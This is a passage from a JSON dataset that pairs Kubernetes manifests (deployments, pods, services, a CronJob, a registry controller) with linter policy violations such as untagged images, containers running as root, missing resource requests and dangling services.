config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "9360",
    "manifest_path": "data/manifests/the_stack_sample/sample_3549.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20191112-9f0441013\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"deck\" is not set to runAsNonRoot"
  },
  {
    "id": "9361",
    "manifest_path": "data/manifests/the_stack_sample/sample_3549.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20191112-9f0441013\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"deck\" has cpu request 0"
  },
  {
    "id": "9362",
    "manifest_path": "data/manifests/the_stack_sample/sample_3549.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20191112-9f0441013\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"deck\" has memory limit 0"
  },
  {
    "id": "9363",
    "manifest_path": "data/manifests/the_stack_sample/sample_3550.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: do-snapshotter\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: do-snapshotter\n          image: dtrierweiler/do-snapshotter\n          env:\n          - name: DIGITALOCEAN_TOKEN\n            valueFrom:\n              secretKeyRef:\n                name: do-token\n                key: access-token\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"do-snapshotter\" is using an invalid container image, \"dtrierweiler/do-snapshotter\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9364",
    "manifest_path": "data/manifests/the_stack_sample/sample_3550.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: do-snapshotter\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: do-snapshotter\n          image: dtrierweiler/do-snapshotter\n          env:\n          - name: DIGITALOCEAN_TOKEN\n            valueFrom:\n              secretKeyRef:\n                name: do-token\n                key: access-token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"do-snapshotter\" does not have a read-only root file system"
  },
  {
    "id": "9365",
    "manifest_path": "data/manifests/the_stack_sample/sample_3550.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: do-snapshotter\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: do-snapshotter\n          image: dtrierweiler/do-snapshotter\n          env:\n          - name: DIGITALOCEAN_TOKEN\n            valueFrom:\n              secretKeyRef:\n                name: do-token\n                key: access-token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"do-snapshotter\" is not set to runAsNonRoot"
  },
  {
    "id": "9366",
    "manifest_path": "data/manifests/the_stack_sample/sample_3550.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: do-snapshotter\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: do-snapshotter\n          image: dtrierweiler/do-snapshotter\n          env:\n          - name: DIGITALOCEAN_TOKEN\n            valueFrom:\n              secretKeyRef:\n                name: do-token\n                key: access-token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"do-snapshotter\" has cpu request 0"
  },
  {
    "id": "9367",
    "manifest_path": "data/manifests/the_stack_sample/sample_3550.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: do-snapshotter\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: do-snapshotter\n          image: dtrierweiler/do-snapshotter\n          env:\n          - name: DIGITALOCEAN_TOKEN\n            valueFrom:\n              secretKeyRef:\n                name: do-token\n                key: access-token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"do-snapshotter\" has memory limit 0"
  },
  {
    "id": "9368",
    "manifest_path": "data/manifests/the_stack_sample/sample_3552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    ports:\n    - containerPort: 12345\n      hostPort: 12345\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9369",
    "manifest_path": "data/manifests/the_stack_sample/sample_3552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    ports:\n    - containerPort: 12345\n      hostPort: 12345\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9370",
    "manifest_path": "data/manifests/the_stack_sample/sample_3552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    ports:\n    - containerPort: 12345\n      hostPort: 12345\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "9371",
    "manifest_path": "data/manifests/the_stack_sample/sample_3552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    ports:\n    - containerPort: 12345\n      hostPort: 12345\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "9372",
    "manifest_path": "data/manifests/the_stack_sample/sample_3552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    ports:\n    - containerPort: 12345\n      hostPort: 12345\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "9373",
    "manifest_path": "data/manifests/the_stack_sample/sample_3552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    ports:\n    - containerPort: 12345\n      hostPort: 12345\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "9374",
    "manifest_path": "data/manifests/the_stack_sample/sample_3552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    ports:\n    - containerPort: 12345\n      hostPort: 12345\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "9375",
    "manifest_path": "data/manifests/the_stack_sample/sample_3552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    ports:\n    - containerPort: 12345\n      hostPort: 12345\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "9376",
    "manifest_path": "data/manifests/the_stack_sample/sample_3556.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  namespace: default\n  name: deck\nspec:\n  selector:\n    app: deck\n  ports:\n  - port: 80\n    targetPort: 8080\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:deck])"
  },
  {
    "id": "9377",
    "manifest_path": "data/manifests/the_stack_sample/sample_3558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    control-plane: controller-manager\n  name: catalog-service\n  namespace: profiles-system\nspec:\n  ports:\n  - name: http\n    port: 8000\n  selector:\n    control-plane: controller-manager\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[control-plane:controller-manager])"
  },
  {
    "id": "9378",
    "manifest_path": "data/manifests/the_stack_sample/sample_3559.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: production-litmuschaos\n  name: production-litmuschaos-service\n  namespace: litmuschaos\nspec:\n  ports:\n  - name: production-litmuschaos\n    port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    app: production-litmuschaos\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:production-litmuschaos])"
  },
  {
    "id": "9379",
    "manifest_path": "data/manifests/the_stack_sample/sample_3560.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: kube-registry-v0\n  namespace: kube-system\n  labels:\n    k8s-app: kube-registry\n    version: v0\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: kube-registry\n    version: v0\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-registry\n        version: v0\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: registry\n        image: registry:2.5.1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: REGISTRY_HTTP_ADDR\n          value: :5000\n        - name: REGISTRY_STORAGE_FILESYSTEM_ROOTDIRECTORY\n          value: /var/lib/registry\n        volumeMounts:\n        - name: image-store\n          mountPath: /var/lib/registry\n        ports:\n        - containerPort: 5000\n          name: registry\n          protocol: TCP\n      volumes:\n      - name: image-store\n        persistentVolumeClaim:\n          claimName: kube-registry-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"registry\" does not have a read-only root file system"
  },
  {
    "id": "9380",
    "manifest_path": "data/manifests/the_stack_sample/sample_3560.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: kube-registry-v0\n  namespace: kube-system\n  labels:\n    k8s-app: kube-registry\n    version: v0\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: kube-registry\n    version: v0\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-registry\n        version: v0\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: registry\n        image: registry:2.5.1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: REGISTRY_HTTP_ADDR\n          value: :5000\n        - name: REGISTRY_STORAGE_FILESYSTEM_ROOTDIRECTORY\n          value: /var/lib/registry\n        volumeMounts:\n        - name: image-store\n          mountPath: /var/lib/registry\n        ports:\n        - containerPort: 5000\n          name: registry\n          protocol: TCP\n      volumes:\n      - name: image-store\n        persistentVolumeClaim:\n          claimName: kube-registry-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"registry\" is not set to runAsNonRoot"
  },
  {
    "id": "9381",
    "manifest_path": "data/manifests/the_stack_sample/sample_3560.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: kube-registry-v0\n  namespace: kube-system\n  labels:\n    k8s-app: kube-registry\n    version: v0\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: kube-registry\n    version: v0\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-registry\n        version: v0\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: registry\n        image: registry:2.5.1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: REGISTRY_HTTP_ADDR\n          value: :5000\n        - name: REGISTRY_STORAGE_FILESYSTEM_ROOTDIRECTORY\n          value: /var/lib/registry\n        volumeMounts:\n        - name: image-store\n          mountPath: /var/lib/registry\n        ports:\n        - containerPort: 5000\n          name: registry\n          protocol: TCP\n      volumes:\n      - name: image-store\n        persistentVolumeClaim:\n          claimName: kube-registry-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"registry\" has cpu request 0"
  },
  {
    "id": "9382",
    "manifest_path": "data/manifests/the_stack_sample/sample_3561.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mypod-volumesecret\nspec:\n  containers:\n  - name: volumesecret\n    image: redis\n    volumeMounts:\n    - name: foo\n      mountPath: /etc/foo\n      readOnly: true\n  volumes:\n  - name: foo\n    secret:\n      secretName: mysecret-manifest\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"volumesecret\" is using an invalid container image, \"redis\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9383",
    "manifest_path": "data/manifests/the_stack_sample/sample_3561.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mypod-volumesecret\nspec:\n  containers:\n  - name: volumesecret\n    image: redis\n    volumeMounts:\n    - name: foo\n      mountPath: /etc/foo\n      readOnly: true\n  volumes:\n  - name: foo\n    secret:\n      secretName: mysecret-manifest\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"volumesecret\" does not have a read-only root file system"
  },
  {
    "id": "9384",
    "manifest_path": "data/manifests/the_stack_sample/sample_3561.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mypod-volumesecret\nspec:\n  containers:\n  - name: volumesecret\n    image: redis\n    volumeMounts:\n    - name: foo\n      mountPath: /etc/foo\n      readOnly: true\n  volumes:\n  - name: foo\n    secret:\n      secretName: mysecret-manifest\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"volumesecret\" is not set to runAsNonRoot"
  },
  {
    "id": "9385",
    "manifest_path": "data/manifests/the_stack_sample/sample_3561.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mypod-volumesecret\nspec:\n  containers:\n  - name: volumesecret\n    image: redis\n    volumeMounts:\n    - name: foo\n      mountPath: /etc/foo\n      readOnly: true\n  volumes:\n  - name: foo\n    secret:\n      secretName: mysecret-manifest\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"volumesecret\" has cpu request 0"
  },
  {
    "id": "9386",
    "manifest_path": "data/manifests/the_stack_sample/sample_3561.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mypod-volumesecret\nspec:\n  containers:\n  - name: volumesecret\n    image: redis\n    volumeMounts:\n    - name: foo\n      mountPath: /etc/foo\n      readOnly: true\n  volumes:\n  - name: foo\n    secret:\n      secretName: mysecret-manifest\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"volumesecret\" has memory limit 0"
  },
  {
    "id": "9387",
    "manifest_path": "data/manifests/the_stack_sample/sample_3563.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: django-demo\n  labels:\n    app: django-demo\nspec:\n  ports:\n  - port: 80\n    targetPort: 8000\n    name: django-demo\n  selector:\n    component: django-demo\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[component:django-demo])"
  },
  {
    "id": "9388",
    "manifest_path": "data/manifests/the_stack_sample/sample_3564.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7444\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9389",
    "manifest_path": "data/manifests/the_stack_sample/sample_3564.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7444\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9390",
    "manifest_path": "data/manifests/the_stack_sample/sample_3564.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7444\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9391",
    "manifest_path": "data/manifests/the_stack_sample/sample_3564.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7444\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9392",
    "manifest_path": "data/manifests/the_stack_sample/sample_3564.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7444\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9393",
    "manifest_path": "data/manifests/the_stack_sample/sample_3565.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    discovery.3scale.net/discovery-version: v1\n    discovery.3scale.net/scheme: http\n    discovery.3scale.net/port: '8080'\n    fabric8.io/git-commit: c22fd37f3bd7162ce188a0055d6b1eae75df17c0\n    fabric8.io/iconUrl: img/icons/camel.svg\n    fabric8.io/git-branch: master\n    prometheus.io/scrape: 'true'\n    prometheus.io/port: '9779'\n  labels:\n    expose: 'true'\n    discovery.3scale.net: 'true'\n    app: camel-ose-springboot-xml\n    provider: fabric8\n    version: 1.0.0-SNAPSHOT\n    group: org.mycompany\n  name: camel-ose-springboot-xml\nspec:\n  ports:\n  - name: http\n    port: 8080\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app: camel-ose-springboot-xml\n    provider: fabric8\n    group: org.mycompany\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:camel-ose-springboot-xml group:org.mycompany provider:fabric8])"
  },
  {
    "id": "9394",
    "manifest_path": "data/manifests/the_stack_sample/sample_3568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: kuard\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kuard\n  template:\n    metadata:\n      labels:\n        app: kuard\n        version: '2'\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9395",
    "manifest_path": "data/manifests/the_stack_sample/sample_3568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: kuard\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kuard\n  template:\n    metadata:\n      labels:\n        app: kuard\n        version: '2'\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9396",
    "manifest_path": "data/manifests/the_stack_sample/sample_3568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: kuard\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kuard\n  template:\n    metadata:\n      labels:\n        app: kuard\n        version: '2'\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9397",
    "manifest_path": "data/manifests/the_stack_sample/sample_3568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: kuard\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kuard\n  template:\n    metadata:\n      labels:\n        app: kuard\n        version: '2'\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9398",
    "manifest_path": "data/manifests/the_stack_sample/sample_3568.yaml",
